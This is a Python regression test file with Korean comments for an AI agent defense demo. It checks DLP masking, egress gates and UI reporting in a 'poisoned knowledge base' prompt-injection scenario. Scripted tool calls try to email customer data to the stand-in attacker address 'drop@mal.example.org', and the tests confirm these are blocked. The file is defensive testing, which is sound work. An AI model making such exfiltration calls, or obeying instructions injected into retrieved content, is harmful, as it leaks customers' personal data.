"""전체 Agent Workflow 관측·브라우저 UI 회귀 테스트."""

from __future__ import annotations

import asyncio
import json

from fastapi.testclient import TestClient

from app.ui import app
from scripts.run_demo import _run_arm
from src.agent.demo_runtime import run_workflow_demo
from src.agent.workflow import format_workflow_text


def test_workflow_document_shows_dlp_gate_and_real_rail():
    doc = asyncio.run(run_workflow_demo(
        scenario="poisoned_kb",
        provider_mode="scripted",
        defense_preset="tier_a+dlp_vault",
    ))

    assert doc["meta"]["scripted"] is True
    assert "모델 추론 증거가 아닙니다" in doc["meta"]["scripted_notice"]
    assert doc["meta"]["rail"] in {"ko_agentguard", "heuristic"}
    actions = [a for t in doc["turns"] for a in t["actions"]]
    lookup = next(a for a in actions if a["tool"] == "lookup_customer")
    email = next(a for a in actions if a["tool"] == "send_email")
    assert "KR_RRN" in lookup["dlp_tokens"]
    assert lookup["raw_tool_result"]["rrn"] == "900101-1234561"  # 합성 로컬 원본
    assert lookup["model_visible_result"]["rrn"] == "<KR_RRN_1>"
    assert email["executed"] is False
    assert email["rule"] == "dlp.egress:body"
    assert doc["audit"]["email_count"] == 0

    text = format_workflow_text(doc)
    assert "전체 Agent Workflow" in text
    assert "SCRIPTED ACTION" in text
    assert "after_tool→MODEL" in text


def test_none_arm_records_mock_service_outbox():
    doc = asyncio.run(run_workflow_demo(
        scenario="poisoned_kb",
        provider_mode="scripted",
        defense_preset="none",
    ))
    assert doc["audit"]["email_count"] == 1
    assert doc["summary"]["blocked"] == 0


def test_trace_preview_is_masked_and_raw_never_serialized():
    ep = asyncio.run(_run_arm({}, "poisoned_kb"))
    payload = ep.to_dict()
    dumped = json.dumps(payload, ensure_ascii=False)
    assert "tool_result_raw" not in dumped
    lookup = next(h for h in payload["hops"] if h["tool_name"] == "lookup_customer")
    assert lookup["tool_result_preview"]["rrn"] == "<KR_RRN_MASKED>"
    assert lookup["tool_result_preview"]["phone"] == "<KR_PHONE_MASKED>"


def test_workflow_ui_and_meta_endpoints():
    with TestClient(app) as client:
        page = client.get("/")
        assert page.status_code == 200
        assert "Agent Workflow Console" in page.text
        meta = client.get("/api/meta")
        assert meta.status_code == 200
        assert "poisoned_kb" in meta.json()["scenarios"]
        run = client.post("/api/run", json={
            "scenario": "normal",
            "provider_mode": "scripted",
            "defense_preset": "tier_a",
            "user_input": "",
        })
        assert run.status_code == 200
        assert run.json()["summary"]["finish_reason"] == "done"
        compare = client.post("/api/compare", json={
            "scenario": "poisoned_kb",
            "provider_mode": "gemini",  # 비교 API는 비용 방지를 위해 scripted 로 강제
            "defense_preset": "none",
            "user_input": "",
        })
        assert compare.status_code == 200
        rows = compare.json()["runs"]
        assert [r["meta"]["defense_preset"] for r in rows] == [
            "none", "tier_a", "tier_a+dlp_vault"
        ]
        assert [r["summary"]["blocked"] for r in rows] == [0, 1, 1]


def test_workflow_document_joins_by_call_id_not_position():
    """★UI 가 보여주는 판정이 그 호출의 판정인지★ — 위치 결합 회귀 방지.

    회귀 이력: workflow_document 가 recorder 의 tool_calls 와 episode.hops 를 위치(index)로
    짝지었다. loop.py 에는 둘이 어긋나는 경로가 실재한다 —
      · calls = result.tool_calls[:MAX_PARALLEL_CALLS]   (8개 초과분 절단)
      · 배치 순회 중 deadline 초과 시 break               (남은 호출은 hop 없음)
    그때 UI 는 절단된 lookup_customer 에 다음 턴 send_email 의 BLOCK/egress.email_domains 를
    붙이고, 정작 진짜 차단은 NA 로 사라졌다. 화면이 그럴듯해서 눈으로는 안 잡힌다.
    """
    import asyncio

    from src.agent.loop import MAX_PARALLEL_CALLS, run_episode
    from src.agent.policy import DefenseHooks
    from src.agent.toolworld import default_world
    from src.agent.workflow import WorkflowRecorderProvider, workflow_document
    from src.config import gen_config, load_policy
    from src.providers.base import GenResult, ToolCall

    class _Burst:
        """턴1에서 상한을 넘겨 호출하고, 턴2에서 차단당할 호출을 낸다."""

        name = "burst"

        def __init__(self) -> None:
            self.turn = 0

        async def generate(self, messages, cfg):          # noqa: ARG002
            self.turn += 1
            if self.turn == 1:
                return GenResult(text="", finish_reason="tool_calls", tool_calls=[
                    ToolCall(name="lookup_customer", args={"phone": "010-1234-5678"},
                             call_id=f"L#{i}")
                    for i in range(MAX_PARALLEL_CALLS + 2)])
            if self.turn == 2:
                return GenResult(text="", finish_reason="tool_calls", tool_calls=[
                    ToolCall(name="send_email",
                             args={"to": "drop@mal.example.org", "subject": "x", "body": "y"},
                             call_id="S#0")])
            return GenResult(text="끝", tool_calls=[], finish_reason="stop")

    async def _run():
        policy = load_policy()
        rec = WorkflowRecorderProvider(_Burst(), mode="scripted")
        ep = await run_episode("t", rec, gen_config(policy),
                               hooks=DefenseHooks(policy, {"tier_a": True}, rail=None),
                               world=default_world(), defenses={"tier_a": True},
                               scenario="burst", episode_id="burst0000000")
        return ep, workflow_document(ep, rec, rail_name="none", defenses={"tier_a": True},
                                     provider_label="burst", model="none")

    ep, doc = asyncio.run(_run())
    hops = {h.call_id: h for h in ep.hops if h.tool_name}
    actions = [a for t in doc["turns"] for a in t["actions"]]

    assert len(actions) > len(hops), "상한 절단이 재현되지 않았다 — 테스트 전제가 깨졌다"

    for a in actions:
        real = hops.get(a["call_id"])
        if real is None:
            assert a["decision"] == "NA", (
                f"{a['call_id']}: hop 이 없는데 '{a['decision']}/{a['rule']}' 판정이 붙었다")
            assert not a["executed"]
        else:
            assert a["decision"] == real.gate_decision, f"{a['call_id']}: 판정 불일치"
            assert a["rule"] == real.gate_rule, f"{a['call_id']}: 규칙 불일치"

    # 진짜 차단이 화면에서 사라지지 않아야 한다
    blocked = [a for a in actions if a["decision"] == "BLOCK"]
    assert [a["call_id"] for a in blocked] == ["S#0"], blocked
    assert blocked[0]["rule"] == "egress.email_domains"


def test_tool_error_is_not_reported_as_gate_block():
    """★도구 오류를 게이트 성과로 둔갑시키지 않는다★ — outcome 분류 회귀 방지.

    회귀 이력: loop.py 는 실행 직전에 gate_decision='ALLOW' 를 확정하고, 도구가 예외를
    던지면 executed 만 False 로 남긴다. 표시 계층이 `!executed` 를 차단으로 읽어
    CLI 에 "ALLOW → 차단" 이라는 자기모순 줄이 찍혔고, summary.blocked 까지 1 올랐다.
    데모 중 도구가 한 번만 실패해도 게이트가 막은 것처럼 보인다.
    """
    import asyncio

    from src.agent.loop import run_episode
    from src.agent.policy import DefenseHooks
    from src.agent.toolworld import default_world
    from src.agent.workflow import (WorkflowRecorderProvider, format_workflow_text,
                                    workflow_document)
    from src.config import gen_config, load_policy
    from src.providers.base import GenResult, ToolCall

    class _One:
        name = "one"

        def __init__(self, call: ToolCall) -> None:
            self.call, self.turn = call, 0

        async def generate(self, messages, cfg):          # noqa: ARG002
            self.turn += 1
            if self.turn == 1:
                return GenResult(text="", finish_reason="tool_calls", tool_calls=[self.call])
            return GenResult(text="끝", tool_calls=[], finish_reason="stop")

    def _run(call: ToolCall) -> dict:
        async def _go():
            policy = load_policy()
            rec = WorkflowRecorderProvider(_One(call), mode="scripted")
            ep = await run_episode("t", rec, gen_config(policy),
                                   hooks=DefenseHooks(policy, {"tier_a": True}, rail=None),
                                   world=default_world(), defenses={"tier_a": True},
                                   scenario="c", episode_id="outcome00000")
            return workflow_document(ep, rec, rail_name="n", defenses={"tier_a": True},
                                     provider_label="p", model="n")
        return asyncio.run(_go())

    # ① 도구가 예외 → 게이트는 ALLOW 였으므로 차단이 아니다
    err = _run(ToolCall(name="lookup_customer",
                        args={"phone": "010-1234-5678", "email": "x@y.z"}, call_id="A"))
    act = err["turns"][0]["actions"][0]
    assert act["outcome"] == "error", act
    assert act["decision"] == "ALLOW"
    assert err["summary"]["blocked"] == 0, "도구 오류가 blocked 로 집계됐다"
    assert err["summary"]["errored"] == 1
    assert "ALLOW → 차단" not in format_workflow_text(err), "자기모순 문구가 다시 나타났다"

    # ② 진짜 게이트 차단은 그대로 blocked
    blk = _run(ToolCall(name="send_email",
                        args={"to": "drop@mal.example.org", "subject": "s", "body": "b"},
                        call_id="B"))
    a2 = blk["turns"][0]["actions"][0]
    assert a2["outcome"] == "blocked" and a2["decision"] == "BLOCK"
    assert blk["summary"]["blocked"] == 1 and blk["summary"]["errored"] == 0

    # ③ 정상 실행
    ok = _run(ToolCall(name="search_kb", args={"query": "환불"}, call_id="C"))
    a3 = ok["turns"][0]["actions"][0]
    assert a3["outcome"] == "executed"
    assert ok["summary"]["blocked"] == 0 and ok["summary"]["errored"] == 0


def test_non_tool_hops_are_surfaced_as_runtime_events():
    """★도구 없는 홉도 화면에 남는다★ — provider 오류·안전필터가 통째로 사라지던 회귀 방지.

    회귀 이력: workflow_document 의 turns 는 recorder.turns 에서만 나오고 hop 소스는
    `[h for h in episode.hops if h.tool_name]` 이었다. loop.py 가 provider 오류(140)와
    모델 안전필터 차단(160)을 tool_name 없는 홉으로 남기는데, 이 홉들은 문서 어디에도
    실리지 않아 화면이 "아무 일도 없었다"처럼 보였다.
    """
    import asyncio

    from src.agent.loop import run_episode
    from src.agent.policy import DefenseHooks
    from src.agent.toolworld import default_world
    from src.agent.workflow import (WorkflowRecorderProvider, format_workflow_text,
                                    workflow_document)
    from src.config import gen_config, load_policy

    class _Boom:
        name = "boom"

        async def generate(self, messages, cfg):       # noqa: ARG002
            raise RuntimeError("429 RESOURCE_EXHAUSTED")

    async def _go():
        policy = load_policy()
        rec = WorkflowRecorderProvider(_Boom(), mode="live")
        ep = await run_episode("t", rec, gen_config(policy),
                               hooks=DefenseHooks(policy, {"tier_a": True}, rail=None),
                               world=default_world(), defenses={"tier_a": True},
                               scenario="e", episode_id="boom00000000")
        return ep, workflow_document(ep, rec, rail_name="n", defenses={"tier_a": True},
                                     provider_label="p", model="n")

    ep, doc = asyncio.run(_go())
    non_tool = [h for h in ep.hops if not h.tool_name]
    assert non_tool, "provider 오류 홉이 만들어지지 않았다 — 테스트 전제가 깨졌다"

    events = doc.get("runtime_events") or []
    assert len(events) == len(non_tool), "도구 없는 홉이 문서에서 누락됐다"
    assert any("provider_error" in (e.get("note") or "") for e in events)
    assert "provider_error" in format_workflow_text(doc), "CLI 출력에 런타임 이벤트가 없다"
